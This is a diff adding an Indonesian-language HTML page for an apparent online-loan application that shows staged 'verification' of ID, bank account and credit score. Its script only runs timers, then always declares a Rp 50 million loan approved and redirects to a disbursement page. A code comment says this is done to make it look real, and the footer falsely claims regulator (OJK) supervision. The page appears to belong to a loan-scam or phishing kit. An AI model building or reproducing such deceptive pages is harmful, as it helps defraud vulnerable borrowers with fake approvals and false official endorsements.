@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Menunggu Verifikasi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif}
+body{background:#fff;width:100%;min-height:100vh;display:flex;flex-direction:column}
+.top{background:#11C7C8;padding:14px 16px;color:#fff;display:flex;justify-content:space-between;align-items:center;border-radius:0 0 16px 16px}
+.content{flex:1;padding:20px 16px 90px;display:flex;flex-direction:column;align-items:center;max-width:420px;margin:auto;width:100%}
+.anim-wrap{position:relative;width:120px;height:120px;margin-top:10px}
+.ring{position:absolute;inset:0;border-radius:50%;border:4px solid #e6fbfb}
+.ring2{position:absolute;inset:0;border-radius:50%;border:4px solid transparent;border-top-color:#11C7C8;border-right-color:#1CC812;animation:spin 1.2s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.icon-center{position:absolute;inset:18px;background:#fff;border-radius:50%;display:grid;place-items:center;box-shadow:0 8px 20px rgba(0,0,0,.08);font-size:36px}
+.title{margin-top:18px;font-size:16px;font-weight:800;color:#111;text-align:center}
+.sub{margin-top:6px;font-size:12px;color:#777;text-align:center;line-height:1.5;max-width:300px}
+.timer-box{margin-top:18px;background:#f0fffe;border:1px solid #c6f0f0;border-radius:12px;padding:12px 16px;display:flex;gap:12px;align-items:center;width:100%}
+.timer-num{font-size:28px;font-weight:900;color:#11C7C8;letter-spacing:1px}
+.timer-label{font-size:11px;color:#555;line-height:1.3}
+.timer-label b{color:#111}
+.steps{margin-top:20px;width:100%;background:#fff;border-radius:16px;border:1px solid #f0f0f0;padding:14px;box-shadow:0 8px 24px rgba(0,0,0,.05)}
+.step{display:flex;gap:12px;align-items:flex-start;padding:12px 0;border-bottom:1px solid #f5f5f5}
+.step:last-child{border:none}
+.dot{width:24px;height:24px;border-radius:50%;display:grid;place-items:center;font-size:12px;font-weight:700;flex-shrink:0;transition:.3s}
+.dot.wait{background:#f2f2f2;color:#999;border:1px solid #eee}
+.dot.load{background:#e6fbfb;color:#11C7C8;border:2px solid #11C7C8;border-top-color:transparent;animation:spin .8s linear infinite}
+.dot.done{background:#1CC812;color:#fff}
+.step-text{flex:1}
+.step-text p{font-size:12px;font-weight:700;color:#111}
+.step-text small{font-size:11px;color:#888;display:block;margin-top:2px}
+.step-text .ok{color:#1CC812}
+.bottom{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:420px;background:#fff;padding:14px 16px;border-top:1px solid #f0f0f0;z-index:10}
+.btns{display:flex;gap:10px}
+.btn{flex:1;padding:13px;border-radius:30px;border:none;font-weight:800;font-size:13px;cursor:pointer;transition:.2s}
+.btn-out{background:#eef0f5;color:#111}
+.btn-refresh{background:#11C7C8;color:#fff}
+.help{margin-top:10px;text-align:center;font-size:11px;color:#999}
+</style>
+</head>
+<body>
+
+<div class="top">
+  <h2 style="font-size:16px;font-weight:800">Pengajuan Diproses</h2>
+  <span id="idTrans" style="font-size:12px;background:rgba(255,255,255,.25);padding:5px 10px;border-radius:20px">ID: #88291</span>
+</div>
+
+<div class="content">
+  <div class="anim-wrap">
+    <div class="ring"></div>
+    <div class="ring2"></div>
+    <div class="icon-center">🔍</div>
+  </div>
+
+  <div class="title" id="title">Sedang Memverifikasi Data Anda...</div>
+  <div class="sub" id="sub">Mohon jangan tutup halaman ini. Sistem otomatis sedang mencocokkan KTP, rekening & skor kredit Anda.</div>
+
+  <div class="timer-box">
+    <div class="timer-num" id="timer">01:45</div>
+    <div class="timer-label"><b>Estimasi selesai</b><br>Sisa waktu verifikasi otomatis<br><span style="color:#11C7C8;font-weight:700">Jangan keluar aplikasi</span></div>
+  </div>
+
+  <div class="steps">
+    <div class="step">
+      <div class="dot done">✓</div>
+      <div class="step-text"><p>Pengajuan Diterima</p><small class="ok" id="waktuMasuk">Berhasil • 18:42 WIB</small></div>
+    </div>
+    <div class="step">
+      <div class="dot done">✓</div>
+      <div class="step-text"><p>Data KTP & Selfie</p><small class="ok">Terverifikasi Dukcapil</small></div>
+    </div>
+    <div class="step">
+      <div class="dot load" id="d3"></div>
+      <div class="step-text"><p id="p3">Verifikasi Rekening</p><small id="s3">Mengecek kesamaan nama pemilik...</small></div>
+    </div>
+    <div class="step">
+      <div class="dot wait" id="d4">4</div>
+      <div class="step-text"><p id="p4">Analisa Limit & Pencairan</p><small id="s4">Menunggu antrian sistem OJK</small></div>
+    </div>
+  </div>
+</div>
+
+<div class="bottom">
+  <div class="btns">
+    <button class="btn btn-out" onclick="history.back()">Keluar</button>
+    <button class="btn btn-refresh" id="btnAction" onclick="cekStatus()">Cek Status</button>
+  </div>
+  <div class="help">🛡️ Aman & Diawasi OJK • CS: 1500-123 (24 Jam)</div>
+</div>
+
+<script>
+// === ISI DATA OTOMATIS DARI LOCAL STORAGE ===
+try{
+  const s1=JSON.parse(localStorage.getItem('user_step1')||'{}');
+  const rekBank=localStorage.getItem('rek_bank')||'BCA';
+  const rekNama=localStorage.getItem('rek_nama')||s1.nama||'Nasabah';
+  document.getElementById('idTrans').innerText='ID: #'+Math.floor(10000+Math.random()*90000);
+  document.getElementById('waktuMasuk').innerText='Berhasil • '+new Date().toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'})+' WIB • '+rekNama;
+  // simpan untuk dipakai nanti
+  window._rekInfo = `${rekBank} • ${rekNama} • Sesuai`;
+}catch(e){}
+
+// TIMER MUNDUR
+let sec = 105;
+const timerEl = document.getElementById('timer');
+const int = setInterval(()=>{
+  sec--;
+  let m = String(Math.floor(sec/60)).padStart(2,'0');
+  let s = String(sec%60).padStart(2,'0');
+  timerEl.innerText = `${m}:${s}`;
+  if(sec<=0){ clearInterval(int); selesai(); }
+},1000);
+
+// GANTI STATUS OTOMATIS
+setTimeout(()=>{
+  document.getElementById('d3').className='dot done';
+  document.getElementById('d3').innerHTML='✓';
+  document.getElementById('p3').innerText='Rekening Terverifikasi';
+  document.getElementById('s3').innerText=window._rekInfo || 'BCA • Sesuai';
+  document.getElementById('s3').className='ok';
+  document.getElementById('d4').className='dot load';
+},4000);
+
+function selesai(){
+  document.getElementById('title').innerText='Verifikasi Berhasil! 🎉';
+  document.getElementById('sub').innerText='Selamat! Limit Anda disetujui hingga Rp 50 Juta. Lanjut ke pencairan.';
+  document.getElementById('d4').className='dot done';
+  document.getElementById('d4').innerHTML='✓';
+  document.getElementById('p4').innerText='Limit Disetujui';
+  document.getElementById('s4').innerText='Rp 50.000.000 Tersedia';
+  document.getElementById('s4').className='ok';
+  const btn=document.getElementById('btnAction');
+  btn.innerText='Cairkan Sekarang →';
+  btn.style.background='#1CC812';
+  btn.onclick=function(){ window.location.href='pencairan.html'; };
+  timerEl.innerText='00:00';
+  // AUTO PINDAH SETELAH 2 DETIK (BIAR REAL)
+  setTimeout(()=>{ window.location.href='pencairan.html'; },2000);
+}
+
+function cekStatus(){
+  // kalau belum selesai, reload, kalau sudah selesai pindah
+  if(document.getElementById('timer').innerText==='00:00'){
+    window.location.href='pencairan.html';
+  } else {
+    location.reload();
+  }
+}
+</script>
+</body>
+</html>
